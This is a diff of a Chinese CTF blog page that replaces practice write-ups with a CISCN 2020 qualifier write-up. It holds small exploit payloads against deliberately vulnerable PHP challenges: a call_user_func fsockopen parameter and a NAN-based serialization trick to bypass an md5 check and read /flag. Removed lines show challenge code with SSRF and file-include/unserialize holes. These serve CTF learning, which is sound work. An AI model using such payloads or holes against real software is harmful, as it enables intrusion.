@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUU刷题第二弹, 不要用自己短浅的见识去丈量别人的世界">
+    <meta name="keywords" content="CISCNCISCN全国大学生信息安全竞赛初赛部分Writeup, 不要用自己短浅的见识去丈量别人的世界">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUU刷题第二弹 | Greenplumte4的小屋</title>
+    <title>CISCNCISCN全国大学生信息安全竞赛初赛部分Writeup | Greenplumte4的小屋</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUU刷题第二弹</h1>
+                    <h1 class="description center-align post-title">CISCNCISCN全国大学生信息安全竞赛初赛部分Writeup</h1>
                 </div>
             </div>
         </div>
@@ -429,25 +429,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/CTF-WEB/" class="post-category">
-                                CTF-WEB
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -456,14 +443,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-08-13
+                    2020-08-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2020-08-14
+                    2020-08-21
                 </div>
                 
 
@@ -477,99 +464,57 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>SSRF+sql注入</p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>刚开始就看到了有两个点,url上有注入点</p>
-<p>robots.txt</p>
-<p>拿到源码</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+                <p>今年的题目没有去年的质量高倒是，跟队友一起，看队友秒杀题目觉得自己好菜（bushi</p>
+<p>然后今年主要是去死磕misc了，就没有完整的看web了，就把我看了的web题丢上来吧。</p>
+<p>后面弄懂我再把全队的wp丢上来，毕竟是全队的努力</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><strong>WEB</strong></h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>子进程异常退出后进入父进程查看phpinfo，查看php手册，fsockopen符合user_call_func_array的构造要求</p>
+<pre class=" language-plain"><code class="language-plain">a=fsockopen&b=123</code></pre>
+<h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>这道题跟队友一起想的，但是想了两种办法，有点妙，一个是利用<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43257005/article/details/106118623">NAN的特性</a>，一个是利用浮点数的特性</p>
+<p>本题考点是：str与md5的强转换出现bug</p>
+<pre class=" language-plain"><code class="language-plain"><?php
+class trick&#123;
+ &nbsp; &nbsp;public $trick1 = NAN;
+ &nbsp; &nbsp;public $trick2 = NAN;
+ &nbsp; &nbsp;//&nbsp;public $trick1 = 0.1;
+ &nbsp;  //&nbsp;public $trick2 = 0.1000000000000001;
+ &nbsp; &nbsp;public function __destruct()&#123;
+ &nbsp; &nbsp; &nbsp; &nbsp;$this->trick1 = (string)$this->trick1;
+ &nbsp; &nbsp; &nbsp; &nbsp;if(strlen($this->trick1) > 5 || strlen($this->trick2) > 5)&#123;
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;die("你太长了");
+ &nbsp; &nbsp; &nbsp;  &#125;
 
+ &nbsp; &nbsp; &nbsp; &nbsp;if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2)&#123;
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;echo file_get_contents("/flag");
+ &nbsp; &nbsp; &nbsp;  &#125;
+ &nbsp;  &#125;
+&#125;
 
-<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-
-    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&amp;#123;2,6&amp;#125;(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
-<p>源码审计</p>
-<p>SSRF：</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-</code></pre>
-<p><img src="1.jpg"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p>post和看题</p>
-<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h2><p>php伪协议：</p>
-<p>1.data伪协议</p>
-<p>2.php://filter读取源码</p>
-<p>  php://input执行PHP代码</p>
-<h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>开题给源码：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
-<span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-  <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token keyword">echo</span> <span class="token string">"Not now!"</span><span class="token punctuation">;</span>
-    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
-    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//useless.php</span>
-    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
-  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token delimiter">?></span></code></pre>
-<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h2><h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><script>
+echo serialize(new trick());</code></pre>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>涉及到点击的地方，分析js………</p>
+<p>最后发现是…..</p>
+<p>挑战目标：需要全国所有省份的安全感，都有至少10个ip守护就会共同拿到通关flag。</p>
+<p>等所有的大佬登录之后放flag</p>
+<p>我还傻傻的分析</p>
+<p>我自闭了…………</p>
+<p>flag{同舟共济扬帆起，乘风破浪万里航。}</p>
+<h3 id="the-best-ctf-game"><a href="#the-best-ctf-game" class="headerlink" title="the_best_ctf_game"></a>the_best_ctf_game</h3><p>挺无语的一道题</p>
+<p>拖入010editor</p>
+<p>找规律就对了</p>
+<p><img src="4.PNG"></p>
+<p>而且看能打出来的字符串即可</p>
+<p>flag如下：</p>
+<h3 id="电脑被黑"><a href="#电脑被黑" class="headerlink" title="电脑被黑"></a>电脑被黑</h3><p>取证的题直接躺尸–autopsy</p>
+<p>我用的是windows的</p>
+<p>进入到如下界面</p>
+<p><img src="2.PNG"></p>
+<p>发现发现四个文件，提取出来</p>
+<p>在fakeflag.txt中用010editor分析提取出flag.txt</p>
+<p>虽然是乱码，但是还是作为二进制文件来看吧</p>
+<p>把demo放入ida逆向分析</p>
+<p><img src="3.PNG"></p>
+<p>编写代码如下</p>
+<p>逆一下就行</p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -612,7 +557,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://greenplumte4.github.io/2020/08/13/buu-shua-ti-di-er-dan/">https://greenplumte4.github.io/2020/08/13/buu-shua-ti-di-er-dan/</a>
+                    <a href="https://greenplumte4.github.io/2020/08/21/ciscnciscn-quan-guo-da-xue-sheng-xin-xi-an-quan-jing-sai-chu-sai-writeup/">https://greenplumte4.github.io/2020/08/21/ciscnciscn-quan-guo-da-xue-sheng-xin-xi-an-quan-jing-sai-chu-sai-writeup/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -649,11 +594,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
+                            <span class="chip bg-color">No tag</span>
                         </div>
                     
                 </div>
@@ -824,55 +765,37 @@
                 <i class="far fa-dot-circle"></i>&nbsp;Current
             </div>
             <div class="card">
-                <a href="/2020/08/13/buu-shua-ti-di-er-dan/">
+                <a href="/2020/08/21/ciscnciscn-quan-guo-da-xue-sheng-xin-xi-an-quan-jing-sai-chu-sai-writeup/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="BUU刷题第二弹">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CISCNCISCN全国大学生信息安全竞赛初赛部分Writeup">
                         
-                        <span class="card-title">BUU刷题第二弹</span>
+                        <span class="card-title">CISCNCISCN全国大学生信息安全竞赛初赛部分Writeup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            [网鼎杯 2018]Fakebook考点SSRF+sql注入
-解题刚开始就看到了有两个点,url上有注入点
-robots.txt
-拿到源码
-&lt;?php
-
-
-class UserInfo
-&amp;#123;
-    public $n
+                            今年的题目没有去年的质量高倒是，跟队友一起，看队友秒杀题目觉得自己好菜（bushi
+然后今年主要是去死磕misc了，就没有完整的看web了，就把我看了的web题丢上来吧。
+后面弄懂我再把全队的wp丢上来，毕竟是全队的努力
+WEBeasyph
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-21
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CTF-WEB/" class="post-category">
-                                    CTF-WEB
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Greenplumte4
                             
                         </span>
                     </div>
                 </div>
 
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                </div>
                 
             </div>
         </div>
@@ -883,27 +806,28 @@ class UserInfo
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/03/ctf-web-yuan-ma-xie-lu-fang-shi-zong-jie/">
+                <a href="/2020/07/27/buuoj-gxyctf2019-ping-ping-ping/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="ctf-web源码泄露方式总结">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="buuoj刷题大作战">
                         
-                        <span class="card-title">ctf-web源码泄露方式总结</span>
+                        <span class="card-title">buuoj刷题大作战</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return
+                            [GXYCTF2019]Ping Ping Ping
+最近回归CTF，但是PTA也是会继续更新，加油冲！
+这两天断更的原因是跟小伙伴们一起去打了CyberCTF，菜鸡的团队也能打进60，真的是很高兴了，虽然是几个小伙伴一起组建的hhh
+
+考
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-27
                             </span>
                         <span class="publish-author">
                             
@@ -1125,7 +1049,7 @@ class UserInfo
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">17.4k</span>&nbsp;字
+                class="white-color">17.5k</span>&nbsp;字
             
             
             
